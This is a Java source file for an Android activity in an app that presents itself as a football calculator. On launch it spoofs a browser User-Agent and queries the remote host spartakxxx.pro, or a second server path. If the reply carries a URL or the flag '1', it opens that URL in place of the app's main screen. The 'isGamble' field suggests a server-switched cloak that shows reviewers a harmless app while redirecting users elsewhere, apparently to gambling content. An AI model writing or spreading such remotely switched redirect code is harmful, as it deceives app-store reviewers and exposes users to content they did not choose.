package com.football.cal;

import android.content.Intent;
import android.os.Bundle;
import android.os.Debug;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.football.cal.model.Data;
import com.football.cal.net.HttpClient;

import java.io.IOException;
import java.net.URL;

import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.scalars.ScalarsConverterFactory;
import retrofit2.http.GET;
import retrofit2.http.Url;

public class IntroActivity extends AppCompatActivity {


    public boolean isKeytaro = false;
    public boolean isGamble = false;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (isKeytaro) {
            HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
            interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);

            OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
            httpClient.addInterceptor(new Interceptor() {
                @Override
                public okhttp3.Response intercept(Chain chain) throws IOException {
                    String agent = System.getProperty("http.agent");
                    if (agent != null)
                        agent = "Mozilla/5.0 (Linux; Android 9; SM-G965F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36";
                    Request original = chain.request();
                    Request request = original.newBuilder()
                            .header("User-Agent", agent)
                            .build();
                    return chain.proceed(request);
                }
            });
            httpClient.addInterceptor(interceptor);

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("https://spartakxxx.pro/")
                    .addConverterFactory(ScalarsConverterFactory.create())
                    .client(httpClient.build())
                    .build();

            retrofit.create(Retro.class).intro().enqueue(new Callback<String>() {
                @Override
                public void onResponse(Call<String> call, Response<String> response) {
                    if (response.isSuccessful() && response.body() != null && response.body().startsWith("http")) {
                        if(!isGamble) {
                            startActivity(new Intent(IntroActivity.this, TestActivity.class).putExtra("test", response.body()));
                            //  startActivity(new Intent(IntroActivity.this, MainActivity.class));
                            IntroActivity.this.finish();
                            overridePendingTransition(0, 0);
                        }
                        else {
                           // startActivity(new Intent(IntroActivity.this, ViewActivity.class).putExtra("test", response.body()));
                            //  startActivity(new Intent(IntroActivity.this, MainActivity.class));
                            Log.d("MainActivity", response.body());
                            startActivity(new Intent(IntroActivity.this, TestActivity.class).putExtra("test", response.body()));
                          //  ViewActivity.start(getApplicationContext(), response.body());
                            IntroActivity.this.finish();
                            overridePendingTransition(0, 0);
                        }
                    } else {
                        startActivity(new Intent(IntroActivity.this, MainActivity.class));
                        IntroActivity.this.finish();
                        overridePendingTransition(0, 0);
                    }
                }

                @Override
                public void onFailure(Call<String> call, Throwable t) {

                    startActivity(new Intent(IntroActivity.this, MainActivity.class));
                    IntroActivity.this.finish();
                    overridePendingTransition(0, 0);
                }
            });
        }
        else {
                doRequest();
        }
    }
    private void doRequest() {
        new HttpClient(getApplicationContext()).request(this::result);
    }

    private void result(Data data) {
        if (data != null && "1".equals(data.flag)) {
            // MainGridActivity.start(getApplicationContext());
            startActivity(new Intent(IntroActivity.this, TestActivity.class).putExtra("test", data.url));
            IntroActivity.this.finish();

            //ViewActivity.start(getApplicationContext(), data.url+"&"+ mSubs);
        } else {
            startActivity(new Intent(IntroActivity.this, MainActivity.class));
            IntroActivity.this.finish();
        }
        finish();
    }

    public interface Retro {

        @GET("fT8qBy")
        Call<String> intro();
    }
}
